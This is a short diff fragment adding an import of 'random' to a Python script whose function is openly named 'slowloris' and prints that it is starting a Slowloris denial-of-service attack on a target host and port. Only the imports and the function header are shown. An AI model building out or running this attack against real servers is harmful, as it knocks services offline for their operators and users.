@@ -1,5 +1,6 @@
 import socket
 import time
+import random
 
 def slowloris(target_host, target_port=80, num_sockets=50):
     print(f"[+] Starting Slowloris attack on {target_host}:{target_port}")
